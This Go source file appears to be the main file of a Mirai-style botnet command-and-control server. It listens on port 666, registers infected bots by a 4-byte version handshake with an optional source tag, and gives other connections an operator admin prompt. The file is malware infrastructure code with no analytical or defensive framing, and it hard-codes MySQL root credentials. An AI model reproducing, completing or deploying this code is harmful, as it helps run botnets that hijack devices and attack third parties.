package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "myrox"
const DatabaseTable string  = "myroxxv0"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp4", "0.0.0.0:666")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := tel.Accept()
        if err != nil {
            fmt.Println(err)
            continue
        }
        fmt.Printf("[!] Connection from %s\n", conn.RemoteAddr().String())
        go initialHandler(conn)
    }
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    // Detect bot handshake: 4 bytes 0x00 0x00 0x00 <version>
    buf := make([]byte, 32)
    n, err := conn.Read(buf)
    if err != nil || n <= 0 {
        return
    }

    if n == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        // Optional source string after version
        if buf[3] > 0 {
            stringLen := make([]byte, 1)
            n, err := conn.Read(stringLen)
            if err != nil || n <= 0 {
                return
            }
            var source string
            if stringLen[0] > 0 {
                sourceBuf := make([]byte, stringLen[0])
                n, err := conn.Read(sourceBuf)
                if err != nil || n <= 0 {
                    return
                }
                source = string(sourceBuf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            NewBot(conn, buf[3], "").Handle()
        }
    } else {
        // Fall back to admin prompt
        NewAdmin(conn).Handle()
    }
}


func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
